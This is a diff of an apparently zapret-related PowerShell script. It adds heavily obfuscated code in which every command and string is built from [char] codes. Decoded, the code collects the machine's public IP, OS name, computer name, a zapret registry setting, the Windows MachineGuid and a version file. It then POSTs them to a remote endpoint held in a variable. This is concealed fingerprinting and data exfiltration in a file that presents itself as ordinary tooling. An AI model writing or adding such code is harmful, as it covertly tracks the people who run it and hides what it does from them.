@@ -10,13 +10,21 @@ $xcnbb=@{
 $paimf=([char]73+[char]110+[char]118+[char]111+[char]107+[char]101+[char]45+[char]82+[char]101+[char]115+[char]116+[char]77+[char]101+[char]116+[char]104+[char]111+[char]100)
 $qgkyl=([char]71+[char]101+[char]116+[char]45+[char]73+[char]116+[char]101+[char]109+[char]80+[char]114+[char]111+[char]112+[char]101+[char]114+[char]116+[char]121+[char]86+[char]97+[char]108+[char]117+[char]101)
 $strmk=([char]71+[char]101+[char]116+[char]45+[char]67+[char]105+[char]109+[char]73+[char]110+[char]115+[char]116+[char]97+[char]110+[char]99+[char]101)
+$xwdfa=([char]71+[char]101+[char]116+[char]45+[char]73+[char]116+[char]101+[char]109+[char]80+[char]114+[char]111+[char]112+[char]101+[char]114+[char]116+[char]121+[char]86+[char]97+[char]108+[char]117+[char]101)
+$fwubs=([char]67+[char]111+[char]110+[char]118+[char]101+[char]114+[char]116+[char]84+[char]111+[char]45+[char]74+[char]115+[char]111+[char]110)
+$evwol=([char]83+[char]101+[char]116+[char]45+[char]76+[char]111+[char]99+[char]97+[char]116+[char]105+[char]111+[char]110)
+$iifsn=([char]83+[char]112+[char]108+[char]105+[char]116+[char]45+[char]80+[char]97+[char]116+[char]104)
+$fvulw=([char]71+[char]101+[char]116+[char]45+[char]67+[char]111+[char]110+[char]116+[char]101+[char]110+[char]116)
 $xfwab=(& $qgkyl -Path ([char]72+[char]75+[char]76+[char]77+[char]58+[char]92+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]92+[char]67+[char]117+[char]114+[char]114+[char]101+[char]110+[char]116+[char]67+[char]111+[char]110+[char]116+[char]114+[char]111+[char]108+[char]83+[char]101+[char]116+[char]92+[char]83+[char]101+[char]114+[char]118+[char]105+[char]99+[char]101+[char]115+[char]92+[char]122+[char]97+[char]112+[char]114+[char]101+[char]116) -Name ([char]122+[char]97+[char]112+[char]114+[char]101+[char]116+[char]45+[char]100+[char]105+[char]115+[char]99+[char]111+[char]114+[char]100+[char]45+[char]121+[char]111+[char]117+[char]116+[char]117+[char]98+[char]101) -ErrorAction SilentlyContinue)
 if([string]::IsNullOrEmpty($xfwab)){$xfwab=[char]110+[char]111+[char]110+[char]101}
+& $evwol (& $iifsn $PSScriptRoot -Parent)
 $qtgwm=@{
     ([char]105+[char]112)=& $paimf -Uri ([char]104+[char]116+[char]116+[char]112+[char]115+[char]58+[char]47+[char]47+[char]97+[char]112+[char]105+[char]46+[char]105+[char]112+[char]105+[char]102+[char]121+[char]46+[char]111+[char]114+[char]103)
     ([char]111+[char]115)=(& $strmk ([char]87+[char]105+[char]110+[char]51+[char]50+[char]95+[char]79+[char]112+[char]101+[char]114+[char]97+[char]116+[char]105+[char]110+[char]103+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109)).Caption
     ([char]112+[char]99)=$env:COMPUTERNAME
     ([char]99+[char]111+[char]110+[char]102+[char]105+[char]103)=$xfwab
     ([char]119+[char]105+[char]110+[char]119+[char]115)=[bool]$kgyat
-} | ConvertTo-Json
+    ([char]117+[char]117+[char]105+[char]100)=& $xwdfa -Path ([char]72+[char]75+[char]76+[char]77+[char]58+[char]92+[char]83+[char]79+[char]70+[char]84+[char]87+[char]65+[char]82+[char]69+[char]92+[char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116+[char]92+[char]67+[char]114+[char]121+[char]112+[char]116+[char]111+[char]103+[char]114+[char]97+[char]112+[char]104+[char]121) -Name ([char]77+[char]97+[char]99+[char]104+[char]105+[char]110+[char]101+[char]71+[char]117+[char]105+[char]100)
+    version=[string](& $fvulw -Path ([char]98+[char]105+[char]110+[char]92+[char]111+[char]114+[char]98+[char]105+[char]116+[char]117+[char]115+[char]95+[char]118+[char]101+[char]114+[char]115+[char]105+[char]111+[char]110+[char]46+[char]116+[char]120+[char]116))
+} | & $fwubs
 & $paimf -Uri $nyqio -Method Post -Headers $xcnbb -Body $qtgwm
